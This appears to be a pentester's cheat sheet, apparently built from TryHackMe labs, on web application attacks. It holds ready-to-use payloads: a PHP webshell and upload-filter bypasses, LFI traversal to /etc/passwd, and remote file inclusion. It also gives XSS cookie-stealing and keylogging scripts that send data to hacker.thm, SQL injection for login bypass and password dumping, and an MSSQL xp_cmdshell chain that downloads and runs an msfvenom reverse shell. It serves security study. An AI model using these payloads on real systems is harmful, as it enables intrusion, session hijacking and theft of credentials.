# WebShells RCE Upload Vulnerabilities

there are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) -- a full reverse shell written in PHP

```php
<?php
    echo system($_GET["cmd"]);
?>
```

- add this to a web directory with a filename like 'webshell.php'
- then navigate to the file you uploaded and add to the url your console cmd
  
>e.g. `http://shell.uploadvulns.thm/resources/webshell.php?cmd=id;whoami;ls`

then from here we can upload an RCE

>https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

When the target is ***Windows***, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. 
To obtain RCE using a web shell you need to use ***URL Encoded Powershell Reverse Shell***. This would be copied into the URL as the `cmd` argument:

---

## Client-side filtering and server-side filtering

- Extension Validation
- File Type Filtering
  - MIME validation
  - Magic Number validation
- File Length Filtering
- File Name Filtering
- File Content Filtering

---

## Bypass file filtering

### Send the file directly to the upload point

Why use the webpage with the filter, when you can send the file directly using a tool like curl?

```
curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
```

>To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

## Bypassing Server-Side Filtering

>first step, google alternate extensions e.g. https://en.wikipedia.org/wiki/PHP

The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.

append a file type e.g. `webshell.jpg.php`
collect a burpsuite capture to delete the filter either *before* the page loads *or before* the file is uploaded

### Bypassing using magic numbers

- use nano to add "A" the correct number of times to the start of the file
- use hexeditor to change those characters to magic numbers associated to the target file type

---

# Local File Inclusion (LFI)

### Steps for testing for LFI

1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!  
2. Enter a valid input to see how the web server behaves.
3. Enter invalid inputs, including special characters and common file names.
4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
6. Understand the input validation and if there are any filters!
7. Try the inject a valid entry to read sensitive files


The function `include` is insecure without sanitization 
```php
<?PHP 
	include($_GET["lang"]);
?>
```
`http://webapp.thm/index.php?lang=EN.php`
use **this** to find files 
`http://webapp.thm/get.php?file=/etc/passwd
OR use:
`http://webapp.thm/get.php?file=../../../../etc/passwd`
if you can find directories

use NULL BYTE in the URL to bypass file casting 
`%00

an extra dot in the directory address refers to the current directory.
`http://webapp.thm/index.php?lang=/etc/passwd/.

....//....//....//....//....//etc/passwd

if the web application asks to supply input that has to include a directory such as: `http://webapp.thm/index.php?lang=languages/EN.php` then, to exploit this, we need to include the directory in the payload 
`?lang=languages/../../../../../etc/passwd

# Remote File Inclusion

host a web server using
`python -m http.server 9000`
create a file in the same directory containing:
```php
<?php
print exec('hostname');
?>
```
from the target URL enter 
`http://10.10.192.101/playground.php?file=http://10.4.3.201:9000/host.txt
This will execute the commands stored in hosts.txt

# SSRF

Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:

**When a full URL is used in a parameter in the address bar:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png) 

**A hidden field in a form:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png)  

**A partial URL such as just the hostname:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png)

**Or perhaps only the path of the URL:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png)



---

# XSS 

```HTML
<iframe src="javascript:alert(`xss`)"> 

<script>alert('XSS');</script>

```
	

## DOM  Based XSS 

uses the HTML environment to execute malicious javascript. 
This type of attack commonly uses the script HTML tag

look for parts of the code that access certain variables that an attacker can have control over, such as "`window.location.x` parameters

unsafe JavaScript methods such as `eval()


## Persistent (Server-side) (Stored) XSS

javascript that is run when the server loads the page containing it.

>These can occur when the server does not sanitise the user data when it is ***uploaded to a page.*** 
- Comments on a blog
- User profile information      
- Website Listings


### Bypass word filter

When a word gets removed from a string, there's a helpful trick that you can try.
**Original Payload:**
`<sscriptcript>alert('THM');</sscriptcript>`

**Text to be removed (by the filter):**
`<sscriptcript>alert('THM');</sscriptcript>`

**Final Payload (after passing the filter):**
`<script>alert('THM');</script>`

### Use tag attributes to escape filters

`onload="alert('THM');`
e.g.
 `<img src="[/images/cat.jpg](view-source:https://10-10-4-57.p.thmlabs.com/images/cat.jpg)" onload="alert('THM'); ">


### Polyglot
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``
```


---


## Reflected (Client-side) XSS

javascript that is run on the client-side end of the web application. 

>These are most commonly found when the server doesn't sanitize ***search*** data. 


## Blind XSS

```javascript
// Exits Textarea 
</textarea> 
// Payload with callback to a nc listener
<script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```
- `fetch()` command makes an HTTP request.
- `?cookie=` is the query string containing the victim’s cookies.
- `btoa()` command base64 encodes the victim’s cookies.
- `document.cookie` accesses the victim’s cookies for the Acme IT Support Website.

---
# Command Injection

## Detecting Blind Command Injection

- use payloads that will cause some time delay. For example, the `ping` and `sleep` command

- you can tell the web application to execute commands such as `whoami` and redirect that to a file. We can then use a command such as `cat` to read this newly created file’s contents.

a simple curl payload to an application is possible for command injection.
`curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`

## Useful Payloads
### Linux
| **Payload** | **Description** |
| ---- | ---- |
| `whoami` | See what user the application is running under. |
| `l`s | List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things. |
| `ping` | This command will invoke the application to hang. This will be useful in testing an application for blind command injection. |
| `sleep` | This is another useful payload in testing an application for blind command injection, where the machine does not have `ping` installed. |
| `nc` | Netcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges. |
### Windows
| **Payload** | **Description** |
| ---- | ---- |
| `whoami` | See what user the application is running under. |
| `dir` | List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things. |
| `ping` | This command will invoke the application to hang. This will be useful in testing an application for blind command injection. |
| `timeout` | This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the `ping` command is not installed. |

## Vulnerable Functions 

functions that interact with the operating system to execute commands via shell:
- Exec
- Passthru
- System

## Bypassing Filters

Insert the payload using the hexadecimal value



---
# SQL Injection

the error says this:
`Invalid statement: <code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = *`
So you have to insert `null` to prevent invalid statement
`UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"`

`0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1`

add a space character before registering a new account to gain the same read/write permissions as an account with the same name
```
'admin' --> is a registered account username
you create the username ' admin' to gain the same rights 
```



### Determine columns

Use this
`' ORDER BY 1#`
When nothing heard, increment ++
`' ORDER BY 2#`
`' ORDER BY 3#`

When error reads like *"Unknown column '3' in 'order clause'"* this means the table has two columns

## Determine Version

```bash-notab-nocopy-nocolor
' UNION SELECT @@version, NULL#
```

### Determine schema

```bash-notab-nocopy-nocolor
' UNION SELECT table_schema, table_name FROM information_schema.tables#
```

### Determine tables

```bash-notab-nocopy-nocolor
' UNION SELECT table_name, column_name FROM information_schema.columns#
```

### Dump Data

With knowledge of the available columns in a table, you can now attempt to retrieve the data from those columns. So, you decide to pull user names and passwords from the _users_ table. Type the following command into the User ID: field

`' UNION SELECT user, password FROM users#

### Reference table of commonly used percent encodings related to SQLi:

|Character|Encoding|
|---|---|
|`':'`|`%3A`|
|`'/'`|`%2F`|
|`'?'`|`%3F`|
|`'#'`|`%23`|
|`'['`|`%5B`|
|`']'`|`%5D`|
|`'@'`|`%40`|
|`'!'`|`%21`|
|`'$'`|`%24`|
|`'&'`|`%26`|
|`"'"`|`%27`|
|`'('`|`%28`|
|`')'`|`%29`|
|`'*'`|`%2A`|
|`'+'`|`%2B`|
|`','`|`%2C`|
|`';'`|`%3B`|
|`'='`|`%3D`|
|`'%'`|`%25`|
|`' '`|`%20` or `+`|






### In Band Authentication bypass
~~~
' OR 1=1;--
or
email@email.com' --  
~~~

`bob' AND 1=1--` would update Bob's record, while `bob' AND 1=2--` would not. This demonstrates the SQL injection vulnerability without putting the entire table's records at risk.
### Boolean Return

```SQL
' UNION SELECT 1;--
' UNION SELECT 1,2;--
' UNION SELECT 1,2,3;--
```
enumerates the correct number of columns in the query table

```
' UNION SELECT 1,2,3 where database() like '%';--
```
enumerates database name by scrolling through the wildcard '%' values

```
' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema = '[[DATABASE NAME]]' and table_name like 'a%';--
```
enumerates table name by scrolling through the wildcard '%' values

```
' UNION SELECT 1,2,3 FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA='[[DATABASE_NAME]]' and TABLE_NAME='[[TABLE_NAME]]' and COLUMN_NAME like 'a%';--
```
enumerates column name by scrolling through the wildcard '%' values

```
' UNION SELECT 1,2,3 FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA='[[DATABASE_NAME]]' and TABLE_NAME='[[TABLE_NAME]]' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id'	
```
Again you'll need to cycle through letters, numbers and characters until you find a match. 
>As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name,

```
' UNION SELECT 1,2,3 from [[TABLE_NAME]] where [[COLUMN_NAME]] like 'a%
```
cycles through valid column name entries
```
' UNION SELECT 1,2,3 from [[TABLE_NAME]] where [[COLUMN_NAME]]='[[VALID_ENTRY]]' and [[OTHER_COLUMN_NAME]] like 'a%
```
cycles through row entry data

### Time Based Return

```
' UNION SELECT SLEEP(5);--
```
Same as Boolean Return except when the SLEEP(5) function is hit - the return is equal to TRUE
```
' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```
will sleep if the database name starts with the letter "u"

## xp_cmdshell

**xp_cmdshell** is a system-extended stored procedure in **Microsoft SQL Server** that enables the execution of operating system commands and programs from within SQL Server.

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

~~~
http://10.10.39.50/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
~~~

Generate Payload WIndows MSSQL
```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
```
Start a Python HTTP Server
```shell-session
python3 -m http.server 8000
```

~~~
http://MACHINE_IP/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
~~~
The above SQL statement will call **certutil** to download the **reverse.exe** file from our Python HTTP server and save it to the Windows temp directory for later use.

Start a netcat Listener
```shell-session
nc -lnvp 4444
```
Now, we can run one final stacked query to execute the **reverse.exe** file we previously saved in the `C:\Windows\Temp` directory:
```
http://MACHINE_IP/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --```
```



---

# Now You're here..

Session stealer
`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
Key Logger
`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`


